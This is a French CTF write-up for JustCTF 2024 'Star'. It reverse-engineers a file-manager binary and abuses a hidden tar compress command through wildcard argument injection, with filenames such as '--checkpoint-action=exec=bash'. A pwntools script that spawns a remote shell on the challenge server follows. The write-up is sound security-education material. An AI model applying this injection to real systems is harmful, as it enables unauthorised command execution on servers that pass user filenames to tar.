---
layout: post
title: JustCTF 2024 - Star
subtitle: Linux Command injection
tags: [reverse, commandinjection]
comments: true
---

### JustCTF 2024 - Star

!["Main"](/assets/img/posts/justctf2024/chall2.png "Description")


On nous fournit une archive contenant un binaire. Ce binaire est lancé dans une infra remote.

# Analyse du serveur

On a un serveur qui délivre un menu basique pour créer des fichiers, les éditer, afficher, les supprimer ou les rename.


!["Main"](/assets/img/posts/justctf2024/menu.png "Menu")

Dans le main, on a une référence directe à la vtable C++ utilisé pour les handlers des commandes : 

!["Main"](/assets/img/posts/justctf2024/vtable.png "Vtable lookup")

En regardant de plus près les handlers des commandes, on retrouve une commande caché : 

!["Main"](/assets/img/posts/justctf2024/vtable2.png "Vtable handlers")

# Compress command

La commande compress (7) est une commande caché qui prend en entrée un nom d'archive tar, et va compresser tout le dossier courant dans ce fichier tar.

On a: 

!["Main"](/assets/img/posts/justctf2024/compress.png "compress")

Ici on peut entrer 'archive.tar' dans input_name(), le handler va ensuite vérifier que 'archive.tar' est valide (avec `std::filesystem::status`). Si l'on met un fname invalide (/etc/passwd, ; ou ", ...), on a une exception levé.

`create_cmd_appendix` permet de créer `tar -xf` etr create_full_cmd permet d'avoir la commande complête : 

`tar -cf '[input_user]' *`

# Command injection

On ne peut pas vraiment exploiter ce system directement avec le nom de l'archive car le check_fstat (std::filesystem::status) nous empêche d'injecter correctement une entrée.

Cependant, on peut créer des fichiers dans le dossier courant (avec la commande 1) pour injecter des arguments custom de tar.

Par exemple :

Create -I
Create id
Create zzzz #besoin d'un fichier, sinon tar ne crée pas une archive vide

on aura alors : tar -cf archive.tar * => tar -cf archive.tar -I id XXXRANDOM

On peut alors print l'archive, qui contiendra le résultat de la commande id (argument -I permet d'exec une commande)

!["Main"](/assets/img/posts/justctf2024/cmdexec.png "cmdexec")

De même que pour compress_çmd, on ne peut pas créer des fichiers invalides (/bin/bash par exemple) => à noter que -I est un nom de fichier valide.

Cependant on peut utiliser le cmd rename pour créer des arguments à notre guise

Avec l'aide de GTFObins on peut utiliser une command injection pour obtenir un shell : 

https://gtfobins.github.io/gtfobins/tar/

!["Main"](/assets/img/posts/justctf2024/gtfo.png "gtfo")

On a alors : 
```python
from pwn import *
r = remote("star.nc.jctf.pro", 1337)

r.sendline(b'1')
r.sendline(b'a')
r.sendline(b'1')
r.sendline(b'b')
r.sendline(b'1')
r.sendline(b'c')

r.sendline(b'2')
r.sendline(b'a')
r.sendline(b'--checkpoint=1')
r.sendline(b'2')
r.sendline(b'b')
r.sendline(b'--checkpoint-action=exec=bash')

r.sendline(b'7')
r.sendline(b'random')


r.interactive()
```

On peut alors retrouver le flag /home/flag.txt : justCTF{th3_st4r_1s_sh1n1ng}

